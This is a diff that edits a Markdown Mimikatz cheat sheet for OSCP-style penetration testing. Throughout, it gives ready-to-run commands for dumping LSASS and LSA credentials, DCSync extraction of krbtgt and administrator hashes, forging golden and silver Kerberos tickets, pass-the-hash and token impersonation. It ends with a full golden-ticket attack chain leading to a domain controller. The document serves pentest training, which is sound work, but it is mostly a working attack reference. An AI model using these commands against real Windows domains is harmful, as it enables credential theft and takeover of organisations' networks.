@@ -1,4 +1,4 @@
-# Mimikatz Cheat Sheet (OSCP+ Focused)
+# Mimikatz
 
 !!! tip "Tip"
     Always run `privilege::debug` first before any dump commands — without it, most commands fail silently. If you get `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061`, you're not running as admin or token impersonation failed.
@@ -8,37 +8,24 @@
 
 ## Setup
 
-Run from an **elevated** prompt on a domain-joined Windows machine (cmd or PowerShell):
+Run from an elevated prompt on a domain-joined Windows machine (cmd or PowerShell):
 
 ```cmd
 privilege::debug
 token::elevate
 ```
 
-> As stated above, this requires administrator privileges. 
-
-> Mimikatz cannot be used (as far as I'm aware) on `evil-winrm`
-
 ---
 
 ## 1. Dump Credentials from LSASS (Memory)
-
-### Basic Dump
 
 ```mimikatz
 sekurlsa::logonpasswords
 ```
 
-Lists credentials currently in memory — including:
+Lists credentials currently in memory — including NTLM hashes, clear-text passwords (if cached), and Kerberos TGT info.
 
-- NTLM hashes
-    
-- Clear-text passwords (if cached)
-    
-- Kerberos TGT info
-    
-
-When you come across a valid username & NTLM hash, first, attempt to crack it with hashcat. If you are unable to crack, use `evil-winrm` to perform a PtH attack and move laterally/vertically on the network to another host.
+When you find a valid username and NTLM hash, attempt to crack it with hashcat. If unable to crack, use `evil-winrm` to perform a PtH attack and move laterally.
 
 ---
 
@@ -70,23 +57,14 @@ Confirm with:
 klist
 ```
 
-> Use `.kirbi` files harvested from Rubeus or Mimikatz itself.
-
 ---
 
 ## 4. Silver Ticket Creation
 
-### Prerequisites
-
-- NTLM hash of service account
-    
-- Domain name, SID
-    
-- Service SPN (e.g., HTTP/web01.htb.local)
-    
+Prerequisites: NTLM hash of service account, domain name, domain SID, service SPN.
 
 ```mimikatz
-kerberos::golden /user:<username> /domain:<domain> /sid:<domain-SID> /rc4:<NTLM-hash> /service:<service> /target:<FQDN> /ptt
+kerberos::golden /user:<user> /domain:<domain> /sid:<domain-SID> /rc4:<hash> /service:<service> /target:<FQDN> /ptt
 ```
 
 **Example:**
@@ -99,17 +77,10 @@ kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-32165498
 
 ## 5. Golden Ticket Creation
 
-### Prerequisites
-
-- NTLM hash of **krbtgt**
-    
-- Domain SID
-    
-- Domain name
-    
+Prerequisites: NTLM hash of `krbtgt`, domain SID, domain name.
 
 ```mimikatz
-kerberos::golden /user:<admin-user> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt-hash> /ptt
+kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt
 ```
 
 **Example:**
@@ -134,7 +105,7 @@ lsadump::dcsync /domain:htb.local /user:administrator
 lsadump::dcsync /domain:htb.local /user:krbtgt
 ```
 
-> Requires **Replicating Directory Changes** privilege
+> Requires **Replicating Directory Changes** privilege.
 
 ---
 
@@ -144,14 +115,7 @@ lsadump::dcsync /domain:htb.local /user:krbtgt
 lsadump::secrets
 ```
 
-Useful to extract:
-
-- Service account credentials
-    
-- Saved RDP credentials
-    
-- Cached scheduled task passwords
-    
+Extracts service account credentials, saved RDP credentials, and cached scheduled task passwords.
 
 ---
 
@@ -161,13 +125,11 @@ Useful to extract:
 lsadump::cache
 ```
 
-These are useful for offline cracking using hashcat mode `2100`.
+Useful for offline cracking using hashcat mode `2100`.
 
 ---
 
 ## 9. Pass-the-Hash (PTH) via Token Replacement
-
-Create a token and run a command with impersonated credentials:
 
 ```mimikatz
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
@@ -195,7 +157,7 @@ Impersonate SYSTEM token:
 token::elevate
 ```
 
-Impersonate another user token (from token list):
+Impersonate another user token:
 
 ```mimikatz
 token::impersonate <token_id>
@@ -203,7 +165,7 @@ token::impersonate <token_id>
 
 ---
 
-## 11. Dump All Data in One Shot (Interactive)
+## 11. Dump All Data in One Shot
 
 ```mimikatz
 log
@@ -215,18 +177,7 @@ kerberos::list /export
 
 ---
 
-## 12. Export Tickets for Offline Analysis
-
-```mimikatz
-kerberos::list /export
-```
-
-Move `.kirbi` files for re-use via `kerberos::ptt` or `Rubeus tgtdeleg`
-
----
-## Mimikatz Usage Flow Examples
-
-### Full Golden Ticket Attack Chain
+## Full Golden Ticket Attack Chain
 
 ```powershell
 # From SYSTEM shell on domain-joined box:
@@ -241,26 +192,13 @@ PsExec.exe \\dc01 cmd.exe
 
 ## Summary: Common Use Cases
 
-|Objective|Command|
+| Objective | Command |
 |---|---|
-|Dump LSASS creds|`sekurlsa::logonpasswords`|
-|Extract krbtgt hash|`lsadump::dcsync /user:krbtgt`|
-|Create Golden Ticket|`kerberos::golden /krbtgt:<hash> /ptt`|
-|Create Silver Ticket|`kerberos::golden /rc4:<hash> /service:<svc>`|
-|PTT any `.kirbi` ticket|`kerberos::ptt <ticket.kirbi>`|
-|List current tickets|`kerberos::list`|
-|Dump LSA secrets|`lsadump::secrets`|
-|Impersonate token|`token::impersonate <id>`|
-
----
-
-## References
-
-- [Mimikatz GitHub (gentilkiwi)](https://github.com/gentilkiwi/mimikatz)
-    
-- [ADSecurity: Golden Ticket](https://adsecurity.org/?p=1640)
-    
-- [Mimikatz Module Reference](https://blog.gentilkiwi.com/mimikatz)
-    
-- [SpecterOps Kerberos Series](https://posts.specterops.io/tagged/kerberos)
-    
+| Dump LSASS creds | `sekurlsa::logonpasswords` |
+| Extract krbtgt hash | `lsadump::dcsync /user:krbtgt` |
+| Create Golden Ticket | `kerberos::golden /krbtgt:<hash> /ptt` |
+| Create Silver Ticket | `kerberos::golden /rc4:<hash> /service:<svc>` |
+| PTT any `.kirbi` ticket | `kerberos::ptt <ticket.kirbi>` |
+| List current tickets | `kerberos::list` |
+| Dump LSA secrets | `lsadump::secrets` |
+| Impersonate token | `token::impersonate <id>` |
